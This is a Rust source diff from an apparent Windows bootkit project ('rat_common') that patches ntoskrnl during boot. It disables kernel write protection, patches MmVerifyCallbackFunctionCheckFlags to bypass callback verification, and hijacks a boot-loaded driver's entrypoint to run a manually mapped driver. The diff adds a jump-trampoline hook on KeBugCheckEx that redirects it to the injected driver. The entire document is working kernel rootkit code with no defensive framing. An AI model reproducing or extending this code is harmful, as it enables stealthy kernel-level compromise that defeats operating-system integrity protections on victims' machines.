@@ -4,7 +4,7 @@ use core::{ptr, slice};
 use log::{error, info, warn};
 use rat_common::utils::get_function_code;
 use rat_common::windows::kernel::{InstructionRecoveryInfo, KernelHandoff};
-use rat_common::windows::utils::return_one_patch;
+use rat_common::windows::utils::{insert_jmp_trampoline, return_one_patch};
 use windows_sys::w;
 
 use crate::utils;
@@ -124,14 +124,13 @@ pub fn patch_ntoskrnl(
                 mm_verify_callback_function_check_flags as *mut u8,
                 code.len(),
             );
-
-            mm_verify_callback_function_check_flags_original = empty_buffer.as_ptr();
-            mm_verify_callback_function_check_flags_len = code.len();
-
-            let forward_aligned = (code.len() + 0xFFF) & !0xFFF;
-            empty_buffer = &mut empty_buffer[forward_aligned..];
         }
 
+        mm_verify_callback_function_check_flags_original = empty_buffer.as_ptr();
+        mm_verify_callback_function_check_flags_len = code.len();
+
+        let forward_aligned = (code.len() + 0xFFF) & !0xFFF;
+        empty_buffer = &mut empty_buffer[forward_aligned..];
         info!("Patched MmVerifyCallbackFunctionCheckFlags with {code:02X?}");
     }
 
@@ -153,13 +152,54 @@ pub fn patch_ntoskrnl(
         }
     };
 
+    let (driver_image_base, e) = empty_buffer.split_at_mut(mapping.size);
+    empty_buffer = e;
+
+    let mut ke_bug_check_ex = ptr::null_mut();
+    let mut ke_bug_check_ex_original_len = 0;
+
+    unsafe {
+        pe::iterate_export_address_table_mut(ntoskrnl, |name, function| {
+            if name == c"KeBugCheckEx" {
+                ke_bug_check_ex = function.as_mut_ptr();
+
+                let mut ke_bug_check_ex_hook = ptr::null();
+                pe::iterate_export_address_table_mut(
+                    driver_image_base,
+                    |our_name, our_function| {
+                        if our_name == c"ke_bug_check_ex_hook" {
+                            ke_bug_check_ex_hook = our_function.as_ptr();
+                        }
+                    },
+                );
+
+                if ke_bug_check_ex_hook.is_null() {
+                    warn!("Cannot find exported ke_bug_check_ex_hook in the mapped driver");
+                } else {
+                    if insert_jmp_trampoline(
+                        function,
+                        ke_bug_check_ex_hook as u64,
+                        Some(empty_buffer),
+                        Some(&mut ke_bug_check_ex_original_len),
+                    ) {
+                        info!(
+                            "Inserted jump trampoline to KeBugCheckEx to {ke_bug_check_ex_hook:p}",
+                        );
+                    } else {
+                        warn!("Cannot insert jump trampoline to KeBugCheckEx");
+                    }
+                }
+            }
+        });
+    }
+
+    let ke_bug_check_ex_original = empty_buffer.as_ptr();
+    empty_buffer = &mut empty_buffer[ke_bug_check_ex_original_len..];
+
     match unsafe { utils::get_boot_loaded_module(load_order_list_head, TARGET_HOOKED_DRIVER) } {
         Some(injected_driver) => {
             let entrypoint = injected_driver.kldr_entry.EntryPoint as *mut u8;
             info!("Patching target driver entrypoint at {entrypoint:p}");
-            info!("First 32 bytes: {:02X?}", unsafe {
-                slice::from_raw_parts(entrypoint, 32)
-            });
 
             let trampoline = unsafe {
                 get_function_code(
@@ -169,8 +209,6 @@ pub fn patch_ntoskrnl(
             };
 
             let cr0 = utils::DisableWriteProtection::new();
-            let driver_image_base = empty_buffer.as_ptr() as u64;
-            empty_buffer = &mut empty_buffer[mapping.size..];
             unsafe {
                 let size = trampoline.len();
                 let entrypoint = slice::from_raw_parts_mut(entrypoint, size);
@@ -190,6 +228,11 @@ pub fn patch_ntoskrnl(
                         instructions: mm_verify_callback_function_check_flags_original,
                         instructions_len: mm_verify_callback_function_check_flags_len,
                     },
+                    ke_bug_check_ex: InstructionRecoveryInfo {
+                        address: ke_bug_check_ex,
+                        instructions: ke_bug_check_ex_original,
+                        instructions_len: ke_bug_check_ex_original_len,
+                    },
                 };
                 empty_buffer = &mut empty_buffer[size..];
                 empty_buffer
@@ -200,6 +243,8 @@ pub fn patch_ntoskrnl(
                 // Patching imm64 addresses
                 entrypoint.copy_from_slice(trampoline);
                 entrypoint[2..10].copy_from_slice(&(empty_buffer.as_ptr() as u64).to_le_bytes());
+
+                let driver_image_base = driver_image_base.as_ptr() as u64;
                 entrypoint[12..20].copy_from_slice(
                     &driver_image_base
                         .saturating_add(u64::from(mapping.entrypoint))
